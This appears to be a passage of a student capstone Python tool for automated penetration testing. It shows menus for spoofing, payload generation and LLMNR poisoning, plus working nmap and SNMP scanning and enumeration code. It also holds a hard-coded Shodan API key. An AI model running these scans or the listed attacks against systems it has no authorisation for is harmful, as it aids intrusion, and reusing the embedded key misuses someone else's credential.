#Capstobne Project
#Members: Aw Jin Le Ray, Kim Junghan, Lucas Sim
import sys
import nmap
import shodan
import sqlite3
from sqlite3 import Error
import pyfiglet #pip install pyfiglet
import os
import csv
#import scrapy #pip install scrapy
#from scrapy.spiders import CrawlSpider, Rule
#from scrapy.linkextractors import LinkExtractor
from googlesearch import search #pip install beautifulsoup4 and google
import requests #pip install requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup #pip install bs4
import colorama #pip install colorama
import dns.resolver
import whois
import webb #pip install webb
import builtwith #pip install builtwith
from scapy.all import *
import ldap3
import pandas as pd
from zapv2 import ZAPv2 #pip install python-owasp-zap-v2.4
import time
import subprocess

#FOR OPENVAS
import subprocess
import re

import xmltodict
import lxml.etree as ET
from gvm.connections import UnixSocketConnection
from gvm.protocols.latest import Gmp
from gvm.transforms import EtreeTransform
from gvm.xml import pretty_print
from terminaltables import SingleTable, DoubleTable

# Creating Directories

subprocess.call("mkdir Payloads", shell=True)
subprocess.call("mkdir Reports", shell=True)

#Shodan API KEY
Shodan_APIKEY = 'EBeU0lGqtIO6yCxVFCWC4nUVbvovtjo5'
api = shodan.Shodan(Shodan_APIKEY)
#Spidering Global Variables
total_urls_visited = 0

#Setting Up Database
conn = sqlite3.connect("Spider.db")
conn = sqlite3.connect("APTdatabase.db")
cur = conn.cursor()
conn.execute('ATTACH DATABASE "APTdatabase.db" as "APT"')
conn.execute('ATTACH DATABASE "Spider.db" as "SpiderDB"')
def SpiderDB(list):
    cur.execute('''INSERT INTO SpiderDB.Spider (id, Internal_Links, External_Links) VALUES (NULL, ?, ?)
             ''', list)
def createtables():
    conn.execute('''CREATE TABLE IF NOT EXISTS SpiderDB.Spider
                (id integer primary key, Internal_Links TEXT, External_Links TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.PortDiscovery
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, 
    Reason TEXT, Name TEXT, Product  TEXT, Version  TEXT, Extra_Info TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.HostDiscovery
    (id integer primary key, Host TEXT, State TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.OSDiscovery
    (id integer primary key, Host TEXT, Device_Type TEXT, OS TEXT, OS_CPE TEXT, OS_Details TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.SNMP_OS_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Hardware TEXT, Software TEXT, System_uptime TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.SNMP_Process_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Processes TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.SNMP_Software_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Softwares TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.SNMP_Interface_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Interfaces TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.SMTP_User_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Users TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.NFS_Share_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Shares TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.LDAP_Information_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Server_Info TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.LDAP_Users_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Connection_Entries TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.LDAP_Brute_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, ldap_brute TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.Google_Search
    (id integer primary key, Search TEXT, Results TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.Whois_Enumeration
    (id integer primary key, Host TEXT, Domain TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.RPC
    (id integer primary key, Host TEXT, RPC_Info TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.Vulnerable_Ports
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Vulnerability TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.DNS_Enumeration
    (id integer primary key, Domain TEXT, Record_Type TEXT, Data TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.Built_With
    (id integer primary key, Domain TEXT, Name TEXT, Language TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.Allowed_Methods
    (id integer primary key, Domain TEXT, Item TEXT, Result TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.OpenVAS
    (id integer primary key, Domain TEXT, Vulnerability TEXT, Severity TEXT, CVE_ID TEXT,
                 Risk TEXT, Description TEXT, Solution TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS APT.Packet_Sniffing
    (id integer primary key, Interface TEXT, Timeout TEXT, Filter TEXT, Packet TEXT)''')
    conn.commit()

# def newdatabase(conn):
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.PortDiscovery
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, 
#     Reason TEXT, Name TEXT, Product  TEXT, Version  TEXT, Extra_Info TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.PortDiscovery')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.HostDiscovery
#     (Host TEXT, State TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.HostDiscovery')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.OSDiscovery
#     (Host TEXT, Device_Type TEXT, OS TEXT, OS_CPE TEXT, OS_Details TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.OSDiscovery')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.SNMP_OS_Enumeration
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Hardware TEXT, Software TEXT, System_uptime TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.SNMP_OS_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.SNMP_Process_Enumeration
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Processes TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.SNMP_Process_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.SNMP_Software_Enumeration
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Softwares TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.SNMP_Software_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.SNMP_Interface_Enumeration
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Interfaces TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.SNMP_Interface_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.SMTP_User_Enumeration
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Users TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.SMTP_User_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.NFS_Share_Enumeration
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Shares TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.NFS_Share_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.LDAP_Information_Enumeration
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Server_Info TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.LDAP_Information_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.LDAP_Users_Enumeration
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Connection_Entries TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.LDAP_Users_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.LDAP_Brute_Enumeration
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, ldap_brute TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.LDAP_Brute_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.Google_Search
#     (Search TEXT, Results TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.Google_Search')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.Whois_Enumeration
#     (Host TEXT, Domain TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.Whois_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.RPC
#     (Host TEXT, RPC_Info TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.RPC')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.Vulnerable_Ports
#     (Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Vulnerability TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.Vulnerable_Ports')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.DNS_Enumeration
#     (Domain TEXT, Record_Type TEXT, Data TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.DNS_Enumeration')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.Built_With
#     (Domain TEXT, Name TEXT, Language TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.Built_With')
#     conn.commit()
#     conn.execute('''CREATE TABLE IF NOT EXISTS newDB.Allowed_Methods
#     (Domain TEXT, Item TEXT, Result TEXT)''')
#     conn.commit()
#     conn.execute('INSERT INTO newDB SELECT * FROM oldDB.Allowed_Methods')
#     conn.commit()

def droptables():
    conn.execute('''DELETE FROM APT.HostDiscovery''')
    conn.commit()
    conn.execute('''DELETE FROM APT.OSDiscovery''')
    conn.commit()   
    conn.execute('''DELETE FROM APT.SNMP_OS_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.SNMP_Process_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.SNMP_Software_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.SNMP_Interface_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.SMTP_User_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.NFS_Share_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.LDAP_Information_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.LDAP_Users_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.LDAP_Brute_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.Google_Search''')
    conn.commit()
    conn.execute('''DELETE FROM APT.Whois_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.RPC''')
    conn.commit()
    conn.execute('''DELETE FROM APT.Vulnerable_Ports''')
    conn.commit()
    conn.execute('''DELETE FROM APT.DNS_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM APT.Built_With''')
    conn.commit()
    conn.execute('''DELETE FROM APT.Allowed_Methods''')
    conn.commit()
    conn.execute('''DELETE FROM APT.OpenVAS''')
    conn.commit()
    conn.execute('''DELETE FROM APT.Packet_Sniffing''')
    conn.commit()
    cur.close()
    conn.close()
createtables()
loop = True
def project_menu():
    loop = True
    while loop == True:
        ascii_hi = pyfiglet.figlet_format("Welcome to Automated Pentesting!")
        print(ascii_hi)
        print("\nPlease Select an Option Below.")
        print("1. Reconnaissance")
        print("2. Vulnerability Scanning")
        print("3. Exploitation & Post Exploitation")
        print("4. Database Services")
        print("5. End Session")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            recon_menu()
        elif menu_input == "2":
            vulnscanning_menu()
        elif menu_input == "3":
            exploit_menu()
        elif menu_input == "4":
            database_menu()
        elif menu_input == "5":
            ascii_bye = pyfiglet.figlet_format("Goodbye!")
            print(ascii_bye)
            loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def recon_menu():

    recon_loop = True
    while recon_loop == True:
        ascii_recon = pyfiglet.figlet_format("Reconnaissance")
        print(ascii_recon)
        print("\nPlease Select an Option Below.")
        print("1. Footprinting")
        print("2. Scanning")
        print("3. Enumeration")
        print("4. Exit")
    
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_footprinting = pyfiglet.figlet_format("Footprinting")
            print(ascii_footprinting)
            footprinting_menu()
        elif menu_input == "2":
            ascii_scanning = pyfiglet.figlet_format("Scanning")
            print(ascii_scanning)
            scanning_menu()
        elif menu_input == "3":
            ascii_enum = pyfiglet.figlet_format("Enumeration")
            print(ascii_enum)
            enum_menu()
        elif menu_input == "4":
            recon_loop = False
        else:
                print("Invalid Input!\nPlease Try Again!")
                continue

def footprinting_menu():
    footprinting_loop = True
    while footprinting_loop == True:
        print("\nPlease Select an Option Below.")
        print("1. Google Search")
        print("2. Whois Lookup")
        print("3. Exit")

        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_google = pyfiglet.figlet_format("Google Search")
            print(ascii_google)
            googleSearch()
        elif menu_input == "2":
            ascii_whois = pyfiglet.figlet_format("Whois Lookup")
            print(ascii_whois)
            whois_enum()
        elif menu_input == "3":
            footprinting_loop = False
        else:
                print("Invalid Input!\nPlease Try Again!")
                continue



def scanning_menu():
    scanning_loop = True
    while scanning_loop == True:
        #Input Scanning Options
        print("\nPlease Select an Option Below.")
        print("1. Host Discovery")
        print("2. Port and Service Discovery")
        print("3. OS Discovery")
        print("4. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Host Discovery")
            print(ascii_1)
            hostDiscovery()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Port and Service Discovery")
            print(ascii_2)
            portDiscovery()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("OS Discovery")
            print(ascii_3)
            osDiscovery()
        elif menu_input == "4":
            scanning_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue



def enum_menu():
    enum_loop = True
    while enum_loop == True:
        #Input Scanning Options
        print("\nPlease Select an Option Below.")
        print("1. Spidering")
        print("2. SNMP OS Enumeration")
        print("3. SNMP Processes Enumeration")
        print("4. SNMP Software Enumeration")
        print("5. SNMP Interface Enumeration")
        print("6. SMTP Users Enumeration")
        print("7. NFS Share Enumeration")
        print("8. LDAP Information Enumeration")
        print("9. LDAP Users Enumeration")
        print("10. LDAP Username Enumeration using LDAP Brute")
        print("11. RPC Information Enumeration")
        print("12. DNS Enumeration")
        print("13. Website Allowed Methods")
        print("14. Website Built With")
        print("15. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Spidering")
            print(ascii_1)
            spidering()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("SNMP OS Enumeration")
            print(ascii_2)
            snmp_os()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("SNMP Processes Enumeration")
            print(ascii_3)
            snmp_processes()
        elif menu_input == "4":
            ascii_4 = pyfiglet.figlet_format("SNMP Software Enumeration")
            print(ascii_4)
            snmp_software()
        elif menu_input == "5":
            ascii_5 = pyfiglet.figlet_format("SNMP Interface Enumeration")
            print(ascii_5)
            snmp_interface()
        elif menu_input == "6":
            ascii_6 = pyfiglet.figlet_format("SMTP Users Enumeration")
            print(ascii_6)
            smtp_users()
        elif menu_input == "7":
            ascii_7 = pyfiglet.figlet_format("NFS Share Enumeration")
            print(ascii_7)
            nfs_share()
        elif menu_input == "8":
            ascii_8 = pyfiglet.figlet_format("LDAP Information Enumeration")
            print(ascii_8)
            ldap_info()
        elif menu_input == "9":
            ascii_9 = pyfiglet.figlet_format("LDAP Users Enumeration")
            print(ascii_9)
            ldap_users()
        elif menu_input == "10":
            ascii_10 = pyfiglet.figlet_format("LDAP Username Enumeration using LDAP Brute")
            print(ascii_10)
            ldap_brute()
        elif menu_input == "11":
            ascii_11 = pyfiglet.figlet_format("RPC Information Enumeration")
            print(ascii_11)
            rpc_info()
        elif menu_input == "12":
            ascii_12 = pyfiglet.figlet_format("DNS Enumeration")
            print(ascii_12)
            dns_enum()
        elif menu_input == "13":
            ascii_13 = pyfiglet.figlet_format("Website Allowed Methods")
            print(ascii_13)
            allowed_methods()
        elif menu_input == "14":
            ascii_14 = pyfiglet.figlet_format("Website Built With")
            print(ascii_14)
            built_with()
        elif menu_input == "15":
            enum_loop = False
        else:
                print("Invalid Input!\nPlease Try Again!")
                continue


def vulnscanning_menu():
    vulnscanning_loop = True
    while vulnscanning_loop == True:
        #Input Scanning Options
        print("\nPlease Select an Option Below.")
        print("1. OpenVAS")
        print("2. Nikto")
        print("3. Port Scanning")
        print("4. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("OpenVAS")
            print(ascii_1)
            openvas_menu()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Nikto")
            print(ascii_2)
            nikto_menu()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("Port Scanning")
            print(ascii_3)
            vulnerable_ports()
        elif menu_input == "4":
            vulnscanning_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def exploit_menu():
    exploit_loop = True
    while exploit_loop == True:
        #Input Scanning Options
        print("\nPlease Select an Option Below.")
        print("1. Packet Sniffer")
        print("2. ARP Spoof")
        print("3. DNS Spoof")
        print("4. VNC Exploit")
        print("5. Keyscan Exploit")
        print("6. LLMNR / NBT-NS Poisoning")
        print("7. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Packet Sniffer")
            print(ascii_1)
            packet_sniffer()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("ARP Spoof")
            print(ascii_2)
            arp_spoof()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("DNS Spoof")
            print(ascii_3)
            dns_spoof()
        elif menu_input == "4":
            ascii_4 = pyfiglet.figlet_format("VNC Exploit")
            print(ascii_4)
            vnc_menu()
        elif menu_input == "5":
            ascii_5 = pyfiglet.figlet_format("Keyscan Exploit")
            print(ascii_5)
            keyscan_menu()
        elif menu_input == "6":
            ascii_6 = pyfiglet.figlet_format("LLMNR / NBT-NS Poisoning")
            print(ascii_6)
            llmnr_nbtns_menu()
        elif menu_input == "7":
            exploit_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def database_menu():
    database_loop = True
    while database_loop == True:
        ascii_database = pyfiglet.figlet_format("Database")
        print(ascii_database)
        print("\nPlease Select an Option Below.")
        print("1. Clear Database")
        print("2. Exit")

        menu_input = (input("Select option: "))
        if menu_input == "1":
            droptables()
            conn.execute('''DELETE FROM Spider''')
            conn.commit()
            print("Database successfully cleared!")
        # elif menu_input == "2":
        #     DBname = str(input('Enter new Database name here: '))
        #     newDBname = DBname + ".db"
        #     conn = sqlite3.connect(newDBname)
        #     conn.execute('ATTACH DATABASE newDBname as "newDB"')
        #     conn.execute('ATTACH DATABASE "APTdatabase.db" as "oldDB"')
        #     newdatabase(conn)
        #     print("Database " + "APTdatabase.db" + "successfully copied as " + newDBname)
        elif menu_input == "2":
            database_loop = False
        else:
                print("Invalid Input!\nPlease Try Again!")
                continue

def openvas_menu():
    openvas_loop = True
    while openvas_loop == True:
        print("\nPlease Select an Option Below.")
        print("1. Start OpenVAS")
        print("2. Start a new OpenVAS Scan")
        print("3. Download OpenVAS Report")
        print("4. Stop OpenVAS")
        print("5. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Start OpenVAS")
            print(ascii_1)
            start_openvas()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Start a new OpenVAS Scan")
            print(ascii_2)
            start_openvas_scan()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("Download OpenVAS Report")
            print(ascii_3)
            get_openvas_report()
        elif menu_input == "4":
            ascii_4 = pyfiglet.figlet_format("Stop OpenVAS")
            print(ascii_4)
            stop_openvas()
        elif menu_input == "5":
            openvas_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def vnc_menu():
    vnc_loop = True
    while vnc_loop == True:
        print("\nPlease Select an Option Below.")
        print("1. Generate VNC Payload")
        print("2. Run VNC Exploit")
        print("3. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Generate VNC Payload")
            print(ascii_1)
            generate_vnc_payload()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Run VNC Exploit")
            print(ascii_2)
            vnc_exploit()
        elif menu_input == "3":
            vnc_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def keyscan_menu():
    keyscan_loop = True
    while keyscan_loop == True:
        print("\nPlease Select an Option Below.")
        print("1. Generate Keyscan Payload")
        print("2. Run Keyscan Exploit")
        print("3. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Generate Keyscan Payload")
            print(ascii_1)
            generate_keyscan_payload()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Run Keyscan Exploit")
            print(ascii_2)
            keyscan_exploit()
        elif menu_input == "3":
            keyscan_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def llmnr_nbtns_menu():
    llmnr_nbtns_loop = True
    while llmnr_nbtns_loop == True:
        print("\nPlease Select an Option Below.")
        print("1. Start Listener")
        print("2. Crack Hash Generated")
        print("3. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Start Listener")
            print(ascii_1)
            start_listener()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Crack Hash Generated")
            print(ascii_2)
            crack_hash_generated()
        elif menu_input == "3":
            llmnr_nbtns_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def portDiscovery():
    target = input("Enter an IP Address to scan: ")
    port_range = input("Enter the range of ports to scan (eg. 1-1024, or enter nothing for no port range): ")
    scanner = nmap.PortScanner()
    if port_range == "":
        scanner.scan(target)
    else:
        scanner.scan(target, port_range)
    for host in scanner.all_hosts():
         print('Host : %s (%s)' % (host, scanner[host].hostname()))
         print('State : %s' % scanner[host].state())
         for proto in scanner[host].all_protocols():
             print('----------')
             print('Protocol : %s' % proto)
     
             lport = scanner[host][proto].keys()
             for port in lport:
                 PortDiscoveryList = [str(target), str(proto), str(port), str(scanner[host][proto][port]['state']), 
                                      str(scanner[host][proto][port]['reason']), str(scanner[host][proto][port]['name']),
                                      str(scanner[host][proto][port]['product']), str(scanner[host][proto][port]['version']),
                                      str(scanner[host][proto][port]['extrainfo'])]
                 cur.execute('''
                 INSERT INTO APT.PortDiscovery (id, Host, Protocol, Port_Number, Port_Status, Reason, Name, 
                 Product, Version, Extra_Info) VALUES (NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 ''', PortDiscoveryList)
                 conn.commit()
                 print ('port : %s\tstate : %s\treason : %s\tservice : %s\t version : %s %s (%s)'
                          % (port, scanner[host][proto][port]['state'], 
                             scanner[host][proto][port]['reason'], 
                             scanner[host][proto][port]['name'],
                             scanner[host][proto][port]['product'],
                             scanner[host][proto][port]['version'],
                             scanner[host][proto][port]['extrainfo']))

def hostDiscovery():
    scanner = nmap.PortScanner()
    target = input("Enter an IP Address to scan: ")
    scanner.scan(target, arguments='-n -sP')
    for host in scanner.all_hosts():
        hostDiscoveryList = [str(host), str(scanner[host]['status']['state'])]
        cur.execute('''
        INSERT INTO APT.HostDiscovery (id, Host, State) VALUES (NULL, ?, ?)
        ''', hostDiscoveryList)
        conn.commit()
        print(host + " is " + scanner[host]['status']['state'])


def osDiscovery():
    target = input("Enter an IP Address to scan: ")
    scanner = nmap.PortScanner()
    scanner.scan(target, arguments='-O')
    for host in scanner.all_hosts():
        print(host)
        if scanner[host]['osmatch'][0]:
            OSDiscoveryList = [str(host), str(scanner[host]['osmatch'][0]['osclass'][0]['type']),
                               str((scanner[host]['osmatch'][0]['osclass'][0]['vendor']) + ' ' +
                               (scanner[host]['osmatch'][0]['osclass'][0]['osfamily']) + ' ' + 
                               (scanner[host]['osmatch'][0]['osclass'][0]['osgen'])),
                                str(scanner[host]['osmatch'][0]['osclass'][0]['cpe'][0]),
                                str(scanner[host]['osmatch'][0]['name'])]
            cur.execute('''
            INSERT INTO APT.OSDiscovery (id, Host, Device_Type, OS, OS_CPE, OS_Details) VALUES (NULL, ?, ?, ?, ?, ?)
            ''', OSDiscoveryList)
            conn.commit()
            print('Device type: ' + (scanner[host]['osmatch'][0]['osclass'][0]['type']))
            print("Operating System running: " + (scanner[host]['osmatch'][0]['osclass'][0]['vendor']) + ' ' +
                                                  (scanner[host]['osmatch'][0]['osclass'][0]['osfamily']) + ' ' + 
                                                  (scanner[host]['osmatch'][0]['osclass'][0]['osgen']))
            print("OS CPE: " + (scanner[host]['osmatch'][0]['osclass'][0]['cpe'][0]))
            print("OS Details: " + (scanner[host]['osmatch'][0]['name']))
        else:
            print('Failed to determine operating system')
 
#SNMP OS Enumeration
def snmp_os():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 161')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)

            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    snmp = nmap.PortScanner()
                    snmp.scan(host, arguments='-sU -p 161 --script snmp-sysdescr')
                    print(snmp[host][proto][port]['script']['snmp-sysdescr'])
                    pos = 0
                    list = []
                    for i in snmp[host][proto][port]['script']['snmp-sysdescr']:
                        pos += 1
                        if i == ":":
                            list.append(pos+1)
                            continue
                    snmpOSList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                                  str(snmp[host][proto][port]['script']['snmp-sysdescr'][list[0]:list[1]-12]),
                                  str(snmp[host][proto][port]['script']['snmp-sysdescr'][list[1]:list[2]-15]),
                                  str(snmp[host][proto][port]['script']['snmp-sysdescr'][list[2]:])]
                    cur.execute('''
                    INSERT INTO APT.SNMP_OS_Enumeration (id, Host, Protocol, Port_Number, Port_Status, Hardware, Software, System_uptime) VALUES (NULL, ?, ?, ?, ?, ?, ?, ?)
                    ''', snmpOSList)
                    conn.commit()
                else:
                    print("Port 161 (SNMP) not opened, can't perform SNMP Enumeration")

#SNMP Processes Enumeration
def snmp_processes():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 161')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    snmp = nmap.PortScanner()
                    snmp.scan(host, arguments='-sU -p 161 --script snmp-processes')
                    print(snmp[host][proto][port]['script']['snmp-processes'])
                    # pos = 0
                    # list = []
                    # for i in snmp[host][proto][port]['script']['snmp-processes']:
                    #     pos += 1
                    #     if i == ":":
                    #         list.append(pos+1)
                    #         continue
                    # snmpProcessesList.append(snmp[host][proto][port]['script']['snmp-processes'][list[0]:list[1]-12])
                    # snmpProcessesList.append(snmp[host][proto][port]['script']['snmp-processes'][list[1]:list[2]-15])
                    # snmpProcessesList.append(snmp[host][proto][port]['script']['snmp-processes'][list[2]:])
                    snmpProcessesList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                                         str(snmp[host][proto][port]['script']['snmp-processes'])]
                    cur.execute('''
                    INSERT INTO APT.SNMP_Process_Enumeration (id, Host, Protocol, Port_Number, Port_Status, Processes) VALUES (NULL, ?, ?, ?, ?, ?)
